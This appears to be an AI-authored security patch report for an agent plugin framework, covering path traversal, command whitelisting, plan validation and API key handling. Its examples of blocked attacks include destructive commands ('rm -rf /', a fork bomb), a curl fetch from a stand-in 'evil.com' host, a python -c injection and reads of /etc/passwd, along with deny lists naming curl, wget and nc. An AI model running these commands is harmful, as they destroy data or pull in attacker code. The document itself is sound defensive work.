**Status:** ✅ **COMPLETED**  
**Date:** 2025-10-26  
**Agent:** GitHub Copilot (AI Security Analyst)  

---

## Overview

Phase 0 emergency security patches have been successfully implemented and tested. All CRITICAL and HIGH vulnerabilities identified in the security analysis are now mitigated with comprehensive test coverage.

## Implemented Patches

### 1. ✅ Path Traversal Fix (Attack #3 - CVSS 8.8)
**File:** `plugins/tool_file_system.py`

**Changes:**
- Modified `_get_safe_path()` to reject any path containing `..`
- Added rejection of absolute paths
- Added verification that resolved path stays within sandbox using `relative_to()`
- Enhanced error messages with security context
- **Review Fix:** Added case-insensitive protected path checking

**Test Coverage:** 20 tests in `tests/security/test_path_traversal.py`

**Example Blocked Attacks:**
```python
# All of these are now BLOCKED:
read_file("../core/kernel.py")           # Path traversal
read_file("/etc/passwd")                 # Absolute path
read_file("sandbox/../core/kernel.py")   # Resolved path outside sandbox
read_file("CORE/kernel.py")              # Case-insensitive bypass (FIXED IN REVIEW)
```

---

### 2. ✅ Command Whitelist (Attack #1 & #5 - CVSS 9.8, 7.1)
**File:** `plugins/tool_bash.py`

**Changes:**
- Created `ALLOWED_COMMANDS` whitelist: `ls, cat, echo, pwd, git, python, pytest, sleep, grep, find, wc`
- Created `DANGEROUS_PATTERNS` blacklist: `rm, dd, curl, wget, nc, sudo, su, chmod, chown, eval, exec, |, &&, ;, >, >>, <, $(, `, -c, /tmp/, /var/tmp/`
- Implemented `_is_command_allowed()` validation method
- All commands now validated before execution
- **Review Fixes:** 
  - Added `sleep` to whitelist (required for timeout tests)
  - Added ` -c ` to dangerous patterns (Python code injection)
  - Added `/tmp/` and `/var/tmp/` to dangerous patterns (temp file execution)
  - Fixed subprocess cleanup on timeout (prevents resource leak)

**Test Coverage:** 23 tests in `tests/security/test_command_injection.py`

**Example Blocked Attacks:**
```python
# All of these are now BLOCKED:
execute_bash("rm -rf /")                      # Dangerous command
execute_bash("ls | grep secret")              # Pipe operator
execute_bash("python -c 'malicious'")         # Python code injection (FIXED IN REVIEW)
execute_bash("/tmp/malicious.sh")             # Temp file execution (FIXED IN REVIEW)
execute_bash(":(){ :|:& };:")                 # Fork bomb
```

---

### 3. ✅ Plan Validation (Attack #1 - CVSS 9.8)
**File:** `plugins/cognitive_planner.py`

**Changes:**
- Added `DANGEROUS_COMMAND_PATTERNS` list: `rm -rf, dd if=, curl, wget, nc, sudo, eval, exec, -c`
- Added `DANGEROUS_PATHS` list: `/etc/passwd, .., core/kernel.py, config/settings.yaml, plugins/base_plugin.py`
- Implemented `_validate_plan_safety()` method
- Plans validated before execution in `execute()` method
- Plans containing dangerous commands/paths are rejected

**Test Coverage:** 14 tests in `tests/security/test_plan_validation.py`

**Example Blocked Plans:**
```python
# All of these plans are now BLOCKED:
"1. Download malicious script: curl http://evil.com/script.sh"
"2. Execute: rm -rf core/"
"3. Modify kernel: edit core/kernel.py"
"4. Exfiltrate secrets: cat config/settings.yaml"
```

---

### 4. ✅ API Key Migration to Environment Variables (Attack #4 - CVSS 7.5)
**Files:** `config/settings.yaml`, `plugins/tool_llm.py`, `.env.example`

**Changes:**
- Updated `config/settings.yaml` to use `${OPENROUTER_API_KEY}` syntax instead of plain text
- Implemented `_resolve_env_vars()` in `tool_llm.py` to resolve `${VAR}` patterns
- Created `.env.example` template with all required environment variables
- API keys now loaded from environment variables only (never committed to git)

**Test Coverage:** Environment variable resolution tested in existing LLM tests

**Before (INSECURE):**
```yaml
tool_llm:
  api_key: "sk-or-v1-actualkey12345"  # ❌ Committed to git!
```

**After (SECURE):**
```yaml
tool_llm:
  api_key: "${OPENROUTER_API_KEY}"    # ✅ Loaded from environment
```

---

### 5. ✅ Protected Paths (Attack #3 - CVSS 8.8)
**File:** `plugins/tool_file_system.py`

**Changes:**
- Added `PROTECTED_PATHS` class variable: `["core/", "config/", ".git/", ".env", "plugins/base_plugin.py"]`
- Implemented `_is_protected_path()` validation method
- Modified `write_file()` to reject writes to protected paths
- **Review Fix:** Case-insensitive path comparison using `.lower()`

**Test Coverage:** 8 tests in `tests/security/test_path_traversal.py` (protected path section)

**Example Blocked Writes:**
```python
# All of these are now BLOCKED:
write_file("core/kernel.py", "backdoor")           # Core files protected
write_file("config/settings.yaml", "api_key=X")    # Config protected
write_file(".env", "OPENROUTER_API_KEY=stolen")    # Env file protected
write_file("CORE/kernel.py", "backdoor")           # Case variant (FIXED IN REVIEW)
```

## Critical Fixes During Review

### 🔴 CRITICAL #1: Case-Insensitive Protected Paths Bypass
**Discovered:** During deep security review  
**CVSS:** 8.8 HIGH  

**Vulnerability:**  
Protected paths used case-sensitive comparison. On case-insensitive filesystems (macOS, Windows), an attacker could bypass protection using `CORE/kernel.py` instead of `core/kernel.py`.

**Exploit:**
```python
write_file("CORE/kernel.py", "malicious code")  # Would pass!
write_file("CONFIG/settings.yaml", "stolen api key")  # Would pass!
```

**Fix:**
```python
# Before (VULNERABLE):
if any(normalized.startswith(p) for p in self.PROTECTED_PATHS):

# After (SECURE):
if any(normalized.lower().startswith(p.lower()) for p in self.PROTECTED_PATHS):
```

**Tests Added:**
- `test_case_insensitive_protected_paths()` - 4 case variant tests

---

### 🔴 CRITICAL #2: Python Code Injection Bypass
**Discovered:** During deep security review  
**CVSS:** 9.8 CRITICAL  

**Vulnerability:**  
Command whitelist allowed `python` but didn't check for `-c` flag, allowing arbitrary code execution. Also didn't check for `/tmp/` path execution.

**Exploit:**
```python
execute_bash("python -c 'import os; os.system(\"rm -rf /\")'")  # Would pass!
execute_bash("/tmp/malicious.sh")  # Would pass!
```

**Fix:**
```python
# Added to DANGEROUS_PATTERNS:
DANGEROUS_PATTERNS = [
    # ... existing patterns ...
    " -c ",          # Python/bash code injection
    "/tmp/",         # Temp file execution
    "/var/tmp/",     # Alternate temp location
]
```

**Additional Fix:** Subprocess cleanup on timeout
```python
# Before (RESOURCE LEAK):
raise TimeoutError(f"Command exceeded timeout of {timeout}s")

# After (SECURE):
proc.kill()
await proc.wait()
raise TimeoutError(f"Command exceeded timeout of {timeout}s")
```

**Tests Added:**
- `test_python_code_injection_blocked()`
- `test_python_temp_file_blocked()`
- `test_bash_c_injection_blocked()`
- `test_git_with_pipe_blocked()`
